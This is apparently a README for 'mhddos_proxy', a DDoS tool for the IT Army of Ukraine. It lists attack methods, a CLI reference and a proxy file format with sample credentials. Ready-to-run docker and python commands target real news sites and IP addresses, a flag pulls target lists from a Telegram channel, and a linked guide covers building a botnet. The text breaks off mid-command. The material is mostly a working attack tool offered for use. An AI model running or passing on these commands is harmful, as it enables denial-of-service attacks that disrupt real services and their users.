DDoS Tool for IT Army of Ukraine

    Built-in proxy database to attack from a huge number of IPs around the world
    Ability to set many goals with automatic load balancing
    Many different DDoS methods
    Resource efficiency due to asynchronous architecture

⏱ Recent updates

Windows Version Update Mac | Linux | Android | Docker: https://telegra.ph/Onovlennya-mhddos-proxy-04-16

    05/18/2022
        Added --copies setting to run multiple copies (recommended for use with 4+ CPU and network> 100 Mbps).

    05/15/2022
        Completely updated asynchronous version, which provides maximum efficiency and minimum load on the system
        Efficient operation with much larger values ​​of the -t parameter (up to 10k) without the risk of "hanging" the whole machine
        A completely new algorithm for load distribution between targets in order to achieve maximum attack power
        Added RGET, RHEAD, RHEX and STOMP attacks.

📜 Earlier
💽 Installation | Installation - instructions HERE
🕹 Launch | Running (different goal options are given)
Docker (for Linux, add sudo at the beginning of the command)

docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp: //194.54.14.131: 4477

Python (if it doesn't work - just python or python3.10 instead of python3)

python3 runner.py https://ria.ru 5.188.56.124:80 tcp: //194.54.14.131: 4477

🛠 Settings (more in the CLI section)

All parameters can be combined, you can specify before and after the list of goals

Change load - -t XXXX - maximum number of simultaneously open connections, default - 1000 (if the machine has one CPU) or 7500 (if more than one).

For Linux, add sudo at the beginning of the docker command

docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

To view information about the progress of the attack, add the --table check box for the table, --debug for the text

docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru

To attack targets from https://t.me/itarmyofukraine2022 add the --itarmy option

docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table --itarmy

📌Automatic new proxy finder for mhddos_proxy

The script itself and installation instructions are here: https://github.com/porthole-ascend-cinnamon/proxy_finder
🐳 Community

    Detailed analysis of mhddos_proxy and installation instructions
    Analysis of mhddos_proxy
    Example of running via docker on OpenWRT
    Create a botnet with 30+ free and standalone (even with PC off) Linux servers
    VPN

CLI

usage: runner.py target [target ...]
                 [-t THREADS]
                 [-c URL]
                 [--table]
                 [--debug]
                 [--vpn]
                 [--rpc RPC]
                 [--http-methods METHOD [[METHOD ...]]
                 [--itarmy]
                 [--copies COPIES]

positional arguments:
  targets List of targets, separated by space

optional arguments:
  -h, --help show this help message and exit
  -c, --config URL | path URL or local path to file with attack targets
  -t, --threads 2000 Total number of threads to run (default is CPU * 1000)
  --table Print log as table
  --debug Print log as text
  --vpn Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
  --rpc 2000 How many requests to send on a single proxy connection (default is 2000)
  --proxies URL path file or local path (ex. proxies.txt) to file with proxies to use
  --http-methods GET List of HTTP (s) attack methods to use (default is GET + POST | STRESS).
  --itarmy Attack targets from https://t.me/itarmyofukraine2022
  --copies 1 Number of copies to run (default is 1)

Own proxies
File format:

IP: PORT
IP: PORT: username: password
username: password @ IP: PORT
protocol: // IP: PORT
protocol: // IP: PORT: username: password
protocol: // username: password @ IP: PORT

where protocol can be one of 3: http | socks4 | socks5, if protocol is not specified, it will be selected by default - http
for example for a public proxy: protocol = socks4 IP = 114.231.123.38 PORT = 3065 the format will be:

socks4: //114.231.123.38: 3065

and for private: protocol = socks4 IP = 114.231.123.38 PORT = 3065 username = isdfuser password = ashd1spass format can be one of the following:

socks4: //114.231.123.38: 3065: isdfuser: ashd1spass
socks4: // isdfuser: ashd1spass @ IP: PORT

URL - Remote file for Python and Docker

python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https: //